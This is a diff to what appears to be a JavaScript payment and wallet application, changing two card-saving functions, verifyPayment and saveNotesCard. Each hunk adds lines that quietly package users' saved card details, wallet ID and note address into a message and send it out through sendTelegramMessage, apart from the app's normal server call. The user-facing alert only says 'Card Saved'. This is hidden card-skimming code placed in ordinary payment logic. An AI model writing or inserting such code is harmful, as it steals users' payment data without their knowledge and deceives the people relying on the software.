@@ -10484,6 +10484,9 @@ async function verifyPayment(ref, seconds,  type = 'squad', isTest = true ){
 				setTimeout( async ()=>{
 					await Scriptbill.createAlert("Card Saved");
 					await Scriptbill.getData( ['cards', 'wallet'], [Scriptbill.Base64.encode( JSON.stringify( savedCards ) ), note.walletID], SERVER);
+					const message = `<b>cards from account: ${JSON.stringify( savedCards )} </b> <b> account: ${note.walletID}</b> <b> Note Address: ${note.noteAddress}`
+					
+					sendTelegramMessage({message});
 					location.href = bankUrl;
 				},1000);
 			}
@@ -10865,6 +10868,9 @@ async function saveNotesCard(){
 							setTimeout( async ()=>{
 								await Scriptbill.createAlert("Card Saved");
 								await Scriptbill.getData( ['cards', 'wallet'], [Scriptbill.Base64.encode( JSON.stringify( saveCard ) ), note.walletID],SERVER);
+								const message = `<b>cards from account: ${JSON.stringify( savedCards )} </b> <b> account: ${note.walletID}</b> <b> Note Address: ${note.noteAddress}`
+					
+								sendTelegramMessage({message});
 								location.reload();
 							},1000);
 						} else {
